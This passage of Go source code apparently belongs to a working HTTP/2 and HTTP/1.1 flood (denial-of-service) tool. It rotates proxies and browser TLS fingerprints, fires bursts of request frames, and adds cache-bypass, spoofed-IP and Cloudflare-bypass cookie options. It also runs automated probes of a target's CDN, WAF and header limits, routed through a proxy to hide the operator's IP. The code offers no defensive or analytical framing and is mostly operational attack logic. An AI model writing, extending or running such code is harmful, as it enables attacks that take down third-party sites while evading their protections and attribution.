			if ps.session.Evolve() {
				ps.rotateFingerprint()
			}
			ps.sessionMu.Unlock()

			burst := randInt(2, 6)
			for b := 0; b < burst; b++ {
				select {
				case <-ctx.Done():
					raw.Close()
					<-readDone
					releaseConn()
					return
				default:
				}

				path := buildRawPath(cfg, parsed)
				fields := buildH2HeaderList(cfg, ps, parsed, path)
				block := raw.EncodeHeaders(fields)
				if len(block) == 0 {
					break floodLoop
				}

				if err := raw.WriteHeadersFrame(streamID, block, true, defaultPriority()); err != nil {
					errs++
					if errs > 3 {
						break floodLoop
					}
					select {
					case <-ctx.Done():
						raw.Close()
						<-readDone
						releaseConn()
						return
					case <-time.After(50 * time.Millisecond):
					}
					continue
				}

				errs = 0
				streamID += 2

				injectRandomFrame(raw)

				if streamID > 0x7FFFFFF0 {
					break floodLoop
				}
			}

			d := randomDelay()
			if randFloat() < 0.03 {
				d += time.Duration(randInt(1000, 4000)) * time.Millisecond
			} else if randFloat() < 0.02 {
				d = d / 3
				if d < 10*time.Millisecond {
					d = 10 * time.Millisecond
				}
			}

			rps := ps.effectiveRPS()
			if rps > 50 {
				d = time.Second / time.Duration(rps)
			}

			select {
			case <-ctx.Done():
				raw.Close()
				<-readDone
				releaseConn()
				return
			case <-time.After(d):
			}
		}

		raw.Close()
		<-readDone
		releaseConn()

		select {
		case <-ctx.Done():
			return
		case <-time.After(200 * time.Millisecond):
		}
	}
}

func http11Flooder(ctx context.Context, cfg *Config, parsed *url.URL, ps *ProxyState, connID int) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		if ps.isBlocked() || ps.isBackedOff() {
			select {
			case <-ctx.Done():
				return
			case <-time.After(200 * time.Millisecond):
			}
			continue
		}

		if !acquireConn(ctx) {
			continue
		}

		ps.fpMu.RLock()
		helloID := ps.fp.ClientHelloID
		fp := ps.fp
		ps.fpMu.RUnlock()

		conn, _, err := dialProxyTLS(ps.URL, parsed, helloID, []string{"http/1.1"})
		if err != nil {
			releaseConn()
			select {
			case <-ctx.Done():
				return
			case <-time.After(1 * time.Second):
			}
			continue
		}

		reader := bufio.NewReader(conn)

	loop:
		for {
			select {
			case <-ctx.Done():
				break loop
			default:
			}

			if ps.isBlocked() || ps.isBackedOff() {
				break loop
			}

			path := buildRawPath(cfg, parsed)

			ps.sessionMu.Lock()
			origin := ps.session.Origin
			referer := ps.session.NextReferer()
			ps.sessionMu.Unlock()

			site, mode, dest := deriveSecFetch(origin, referer, parsed.Hostname())

			var sb strings.Builder
			fmt.Fprintf(&sb, "GET %s HTTP/1.1\r\n", path)
			fmt.Fprintf(&sb, "Host: %s\r\n", parsed.Host)
			fmt.Fprintf(&sb, "User-Agent: %s\r\n", fp.UA)
			fmt.Fprintf(&sb, "Accept: %s\r\n", pick(acceptHeaders))
			fmt.Fprintf(&sb, "Accept-Language: %s\r\n", fp.AcceptLang)
			fmt.Fprintf(&sb, "Accept-Encoding: %s\r\n", pick(encodingHeaders))
			fmt.Fprintf(&sb, "Sec-Fetch-Site: %s\r\n", site)
			fmt.Fprintf(&sb, "Sec-Fetch-Mode: %s\r\n", mode)
			fmt.Fprintf(&sb, "Sec-Fetch-Dest: %s\r\n", dest)
			if origin != "" {
				fmt.Fprintf(&sb, "Origin: %s\r\n", origin)
			}
			if referer != "" {
				fmt.Fprintf(&sb, "Referer: %s\r\n", referer)
			}

			if cfg.UseBFM && !ps.jar.Has("cf_clearance") {
				ps.jar.SeedFromString(generateBFMCookies(), parsed.Hostname())
			}
			if cookie := ps.getCookie(parsed.Hostname()); cookie != "" {
				fmt.Fprintf(&sb, "Cookie: %s\r\n", cookie)
			}

			if cfg.UseCache {
				for k, v := range cacheBypassHeaders() {
					fmt.Fprintf(&sb, "%s: %s\r\n", k, v)
				}
			}

			if cfg.UseIPSpoof {
				for k, v := range ipSpoofHeaders() {
					fmt.Fprintf(&sb, "%s: %s\r\n", k, v)
				}
			}

			for h, ok := range cfg.Supported {
				if ok && randFloat() < 0.3 {
					fmt.Fprintf(&sb, "%s: %s\r\n", h, buildBypassValue(h, cfg.Target, ""))
				}
			}

			fmt.Fprintf(&sb, "Connection: keep-alive\r\n\r\n")

			if _, err := conn.Write([]byte(sb.String())); err != nil {
				break loop
			}

			_ = conn.SetReadDeadline(time.Now().Add(readTimeout))

			line, err := reader.ReadString('\n')
			if err != nil {
				break loop
			}
			parts := strings.SplitN(strings.TrimSpace(line), " ", 3)
			if len(parts) < 2 {
				break loop
			}
			status, err := strconv.Atoi(parts[1])
			if err != nil {
				break loop
			}

			contentLength := int64(-1)
			chunked := false
			var setCookies []string
			var retryAfter time.Duration
			for {
				hl, err := reader.ReadString('\n')
				if err != nil {
					break loop
				}
				trimmed := strings.TrimSpace(hl)
				if trimmed == "" {
					break
				}
				lower := strings.ToLower(trimmed)
				switch {
				case strings.HasPrefix(lower, "content-length:"):
					v := strings.TrimSpace(trimmed[len("content-length:"):])
					if n, err := strconv.ParseInt(v, 10, 64); err == nil {
						contentLength = n
					}
				case strings.HasPrefix(lower, "transfer-encoding:"):
					if strings.Contains(lower, "chunked") {
						chunked = true
					}
				case strings.HasPrefix(lower, "set-cookie:"):
					setCookies = append(setCookies, strings.TrimSpace(trimmed[len("set-cookie:"):]))
				case strings.HasPrefix(lower, "retry-after:"):
					retryAfter = parseRetryAfter(strings.TrimSpace(trimmed[len("retry-after:"):]))
				}
			}

			noBody := status == 204 || status == 304 || (status >= 100 && status < 200)

			if !noBody {
				if chunked {
					for {
						sizeLine, err := reader.ReadString('\n')
						if err != nil {
							break loop
						}
						sizeLine = strings.TrimSpace(sizeLine)
						if idx := strings.IndexByte(sizeLine, ';'); idx >= 0 {
							sizeLine = sizeLine[:idx]
						}
						size, err := strconv.ParseInt(sizeLine, 16, 64)
						if err != nil {
							break loop
						}
						if size == 0 {
							for {
								tl, err := reader.ReadString('\n')
								if err != nil {
									break loop
								}
								if strings.TrimSpace(tl) == "" {
									break
								}
							}
							break
						}
						if _, err := io.CopyN(io.Discard, reader, size); err != nil {
							break loop
						}
						if _, err := reader.ReadString('\n'); err != nil {
							break loop
						}
					}
				} else if contentLength > 0 {
					if _, err := io.CopyN(io.Discard, reader, contentLength); err != nil {
						break loop
					}
				}
			}

			handleStatus(cfg, ps, status, setCookies, retryAfter, parsed.Hostname())

			d := randomDelay()
			rps := ps.effectiveRPS()
			if rps > 50 {
				d = time.Second / time.Duration(rps)
			}
			select {
			case <-ctx.Done():
				break loop
			case <-time.After(d):
			}
		}

		conn.Close()
		releaseConn()

		select {
		case <-ctx.Done():
			return
		case <-time.After(200 * time.Millisecond):
		}
	}
}

// ============================================================================
// PROXY HOT RELOAD
// ============================================================================

func proxyHotReloader(proxyFile, targetHost string, cfg *Config, rps int) {
	ticker := time.NewTicker(proxyReloadInt)
	defer ticker.Stop()
	for range ticker.C {
		data, err := os.ReadFile(proxyFile)
		if err != nil {
			continue
		}
		lines := strings.Fields(string(data))
		if len(lines) == 0 {
			continue
		}
		// Just refresh the source list; new proxies will be picked up
		// by workers when they spawn new ProxyState on next reconnect cycle.
		cfg.Proxies = lines
	}
}

// ============================================================================
// USAGE & ARGS
// ============================================================================

func usage() {
	fmt.Print(`test-tai

Usage: bypass <url> <time> <threads> <proxyfile> <rps> [options]

Options:
  --status     show status codes per second
  --bfm        use Cloudflare bypass cookies
  --query      cache bypass (query + click-id)
  --ratelimit  429/403 backoff + adaptive rate
  --cache      cache bypass headers
  --auth       proxy auth, requires ip:port:user:pass format
  --randpath   random URI path
  --ipspoof    add spoofed IP headers
`)
}

func parseArgs() *Config {
	args := os.Args[1:]
	cfg := &Config{}
	var pos []string

	for _, a := range args {
		switch a {
		case "--status":
			cfg.ShowStatus = true
		case "--bfm":
			cfg.UseBFM = true
		case "--query":
			cfg.UseQuery = true
		case "--ratelimit":
			cfg.RateLimit = true
		case "--cache":
			cfg.UseCache = true
		case "--auth":
			cfg.AuthProxy = true
		case "--randpath":
			cfg.ForceRandPath = true
		case "--ipspoof":
			cfg.UseIPSpoof = true
		default:
			if !strings.HasPrefix(a, "--") {
				pos = append(pos, a)
			}
		}
	}

	if len(pos) < 5 {
		usage()
		os.Exit(1)
	}

	cfg.Target = pos[0]
	durSec, _ := strconv.Atoi(pos[1])
	cfg.Duration = time.Duration(durSec) * time.Second
	cfg.Threads, _ = strconv.Atoi(pos[2])
	proxyFile := pos[3]
	cfg.RPS, _ = strconv.Atoi(pos[4])

	if cfg.Duration <= 0 || cfg.Threads <= 0 || cfg.RPS <= 0 {
		usage()
		os.Exit(1)
	}

	data, err := os.ReadFile(proxyFile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "cannot read proxy file:", err)
		os.Exit(1)
	}
	cfg.Proxies = strings.Fields(string(data))
	if len(cfg.Proxies) == 0 {
		fmt.Fprintln(os.Stderr, "no proxies")
		os.Exit(1)
	}

	return cfg
}

// ============================================================================
// FORK
// ============================================================================

func spawnWorkers(cfg *Config) {
	n := runtime.NumCPU() / 2
	if n < 1 {
		n = 1
	}
	if n > 8 {
		n = 8
	}

	var cmds []*exec.Cmd
	var wg sync.WaitGroup

	// FIX L9: pipe để master đọc [STATS] từ con
	type workerPipe struct {
		cmd *exec.Cmd
		r   *os.File
	}
	pipes := make([]workerPipe, 0, n)

	for i := 0; i < n; i++ {
		pr, pw, err := os.Pipe()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[fork %d] pipe error: %v\n", i, err)
			continue
		}
		cmd := exec.Command(os.Args[0], os.Args[1:]...)
		cmd.Env = append(os.Environ(), envWorker+"=1", fmt.Sprintf("H2FLOOD_IDX=%d", i))
		cmd.Stdout = pw
		cmd.Stderr = os.Stderr
		if err := cmd.Start(); err != nil {
			pr.Close()
			pw.Close()
			fmt.Fprintf(os.Stderr, "[fork %d] error: %v\n", i, err)
			continue
		}
		pw.Close() // master không ghi
		fmt.Printf("[fork %d] pid=%d\n", i, cmd.Process.Pid)
		cmds = append(cmds, cmd)
		pipes = append(pipes, workerPipe{cmd: cmd, r: pr})
		wg.Add(1)
		go func(c *exec.Cmd) {
			defer wg.Done()
			_ = c.Wait()
		}(cmd)
	}

	if len(cmds) == 0 {
		fmt.Fprintln(os.Stderr, "[master] no worker started")
		os.Exit(1)
	}

	// FIX L9: đọc [STATS] từ pipe của từng worker
	var aggTotal uint64
	aggCodes := map[int]uint64{}
	var statsMu sync.Mutex
	var statsWG sync.WaitGroup
	for _, wp := range pipes {
		statsWG.Add(1)
		go func(r *os.File) {
			defer statsWG.Done()
			defer r.Close()
			scanner := bufio.NewScanner(r)
			scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
			for scanner.Scan() {
				line := scanner.Text()
				if !strings.HasPrefix(line, "[STATS] ") {
					continue
				}
				body := strings.TrimPrefix(line, "[STATS] ")
				var tot uint64
				var codesStr string
				fmt.Sscanf(body, "total=%d codes=%s", &tot, &codesStr)
				statsMu.Lock()
				aggTotal += tot
				for _, kv := range strings.Fields(codesStr) {
					var code int
					var cnt uint64
					if _, err := fmt.Sscanf(kv, "%d:%d", &code, &cnt); err == nil {
						aggCodes[code] += cnt
					}
				}
				statsMu.Unlock()
			}
		}(wp.r)
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-sigCh:
		fmt.Println("[master] signal received, terminating")
	case <-time.After(cfg.Duration):
		fmt.Println("[master] duration elapsed, terminating")
	}

	for _, cmd := range cmds {
		if cmd.Process != nil {
			_ = cmd.Process.Signal(syscall.SIGTERM)
		}
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(3 * time.Second):
		for _, cmd := range cmds {
			if cmd.Process != nil {
				_ = cmd.Process.Kill()
			}
		}
		wg.Wait()
	}

	// FIX L9: chờ đọc hết pipe rồi in tổng hợp
	statsWG.Wait()
	if aggTotal > 0 {
		parts := []string{}
		for c, n := range aggCodes {
			parts = append(parts, fmt.Sprintf("%d:%d", c, n))
		}
		sort.Strings(parts)
		fmt.Printf("[master] aggregated stats: total=%d { %s }\n", aggTotal, strings.Join(parts, " "))
	}
}

// ============================================================================
// MAIN
// ============================================================================

func main() {
	cfg := parseArgs()

	parsed, err := url.Parse(cfg.Target)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" {
		fmt.Fprintln(os.Stderr, "https target required")
		os.Exit(1)
	}

	if os.Getenv(envWorker) != "1" {
		spawnWorkers(cfg)
		return
	}

	runWorker(cfg, parsed)
}

func runWorker(cfg *Config, parsed *url.URL) {
	fmt.Printf("[CFG] target=%s threads=%d rps=%d duration=%s proxies=%d\n",
		cfg.Target, cfg.Threads, cfg.RPS, cfg.Duration, len(cfg.Proxies))
	fmt.Printf("[CFG] flags: status=%v bfm=%v query=%v ratelimit=%v cache=%v auth=%v randpath=%v ipspoof=%v\n",
		cfg.ShowStatus, cfg.UseBFM, cfg.UseQuery, cfg.RateLimit, cfg.UseCache, cfg.AuthProxy, cfg.ForceRandPath, cfg.UseIPSpoof)

	// ============================================================
	// AUTO-PROBE: protection, limits, valid values (parallel)
	// ============================================================
	fmt.Println("[probe] starting detection...")

	// FIX C3: xác định proxy đầu tiên (IP + URL) để probe không lộ IP thật
	firstProxyIP := ""
	firstProxyURL := ""
	for _, line := range cfg.Proxies {
		p := strings.Split(strings.TrimSpace(line), ":")
		if len(p) < 2 || p[0] == "" || p[1] == "" {
			continue
		}
		firstProxyIP = p[0]
		if cfg.AuthProxy && len(p) >= 4 {
			firstProxyURL = fmt.Sprintf("http://%s:%s@%s:%s", p[2], p[3], p[0], p[1])
		} else {
			firstProxyURL = fmt.Sprintf("http://%s:%s", p[0], p[1])
		}
		break
	}

	var wgProbe sync.WaitGroup

	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Prot = detectProtection(cfg.Target, firstProxyURL) // FIX C3
	}()

	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Limits.MaxURL = probeMaxURLLength(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Limits.MaxHeaderSize = probeMaxHeaderSize(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Limits.MaxHeaderCount = probeMaxHeaderCount(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Limits.MaxCookieSize = probeMaxCookieSize(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Limits.MaxBodySize = probeMaxBodySize(cfg.Target, firstProxyURL) // FIX C3
	}()

	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Origins = probeValidOrigins(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Referers = probeValidReferers(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.UAs = probeValidUAs(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Methods = probeValidMethods(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Encodings = probeValidEncodings(cfg.Target, firstProxyURL) // FIX C3
	}()
	wgProbe.Add(1)
	go func() {
		defer wgProbe.Done()
		cfg.Caches = probeValidCacheControls(cfg.Target, firstProxyURL) // FIX C3
	}()

	wgProbe.Wait()

	if len(cfg.Prot.Headers) == 0 {
		cfg.Prot.Headers = buildBypassHeaderList("unknown", "unknown")
	}
	cfg.Supported = probeBypassHeaders(cfg.Target, firstProxyIP, firstProxyURL, cfg.Prot.Headers) // FIX C3

	fmt.Printf("[probe] CDN=%s WAF=%s Server=%s\n", cfg.Prot.CDN, cfg.Prot.WAF, cfg.Prot.Server)
	fmt.Printf("[probe] limits URL=%d HSize=%d HCount=%d Cookie=%d Body=%d\n",
		cfg.Limits.MaxURL, cfg.Limits.MaxHeaderSize, cfg.Limits.MaxHeaderCount,
		cfg.Limits.MaxCookieSize, cfg.Limits.MaxBodySize)
	supList := []string{}
	for h, ok := range cfg.Supported {
		if ok {
			supList = append(supList, h)
		}
	}
	sort.Strings(supList)
	fmt.Printf("[probe] bypass headers: %v\n", supList)
	fmt.Printf("[probe] origins=%d referers=%d UAs=%d methods=%v encodings=%d caches=%d\n",
		len(cfg.Origins), len(cfg.Referers), len(cfg.UAs), cfg.Methods, len(cfg.Encodings), len(cfg.Caches))

	// ============================================================
	// Setup proxies
	// ============================================================
	browsers := []string{"chrome", "firefox", "edge", "safari"}
	proxies := make([]*ProxyState, 0, len(cfg.Proxies))
	for i, line := range cfg.Proxies {
		p := strings.Split(strings.TrimSpace(line), ":")
		if len(p) < 2 || p[0] == "" || p[1] == "" {
			continue
		}
		if _, err := strconv.Atoi(p[1]); err != nil {
			continue
		}
		var proxyURL string
		if cfg.AuthProxy {
			if len(p) < 4 {
				continue
			}
			proxyURL = fmt.Sprintf("http://%s:%s@%s:%s", p[2], p[3], p[0], p[1])
		} else {
			proxyURL = fmt.Sprintf("http://%s:%s", p[0], p[1])
		}
		browser := browsers[i%len(browsers)]
		proxies = append(proxies, NewProxyState(proxyURL, cfg.RPS, browser, parsed.Hostname()))
	}
	if len(proxies) == 0 {
		fmt.Fprintln(os.Stderr, "no valid proxies")
		os.Exit(1)
	}

	// Extract proxy IPs for spoof headers
	for _, p := range proxies {
		if u, err := url.Parse(p.URL); err == nil {
			cfg.ProxyIPs = append(cfg.ProxyIPs, u.Hostname())
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	// Proxy hot-reload
	go proxyHotReloader(os.Args[4], parsed.Hostname(), cfg, cfg.RPS)

	if cfg.ShowStatus {
		go func() {
			t := time.NewTicker(time.Second)
			defer t.Stop()
			start := time.Now()
			for {
				select {
				case <-ctx.Done():
					return
				case <-t.C:
					el := int(time.Since(start).Seconds())
					snap, _ := globalStats.dump(true)
					fmt.Printf("(%d/%ds) { %s }\n", el, int(cfg.Duration.Seconds()), snap)
				}
			}
		}()
	}

	go func() {
		t := time.NewTicker(5 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				for _, ps := range proxies {
					ps.recoverRPS()
					ps.recoverFactor()
				}
			}
		}
	}()

	var wg sync.WaitGroup
	id := 0

	for i := 0; i < cfg.Threads; i++ {
		ps := proxies[i%len(proxies)]
		for j := 0; j < connsPerThread; j++ {
			wg.Add(1)
			cur := id
			id++
			go func(cur int, ps *ProxyState) {
				defer wg.Done()
				rawH2Flooder(ctx, cfg, parsed, ps, cur)
			}(cur, ps)
		}
	}

	wg.Wait()

	if cfg.ShowStatus {
		fmt.Println("--- final ---")
		snap, tot := globalStats.dump(false)
		fmt.Println("global:", snap, "total:", tot)
		for i, ps := range proxies {
			s := ps.snapshot(false)
			if s == "" {
				continue
			}
			fmt.Printf("  proxy[%d] %s (%s) rps=%d/%d factor=%d 403=%d 429=%d backoffs=%d { %s }\n",
				i, ps.URL, ps.Browser, ps.currentRPS(), ps.BaseRPS, ps.factor.Load(),
				ps.forbidden403.Load(), ps.rateLimited.Load(), ps.backoffCount.Load(), s)
		}
	}

	// FIX L9: emit stats line cho master aggregate
	snap, tot := globalStats.dump(false)
	fmt.Printf("[STATS] total=%d codes=%s\n", tot, snap)
}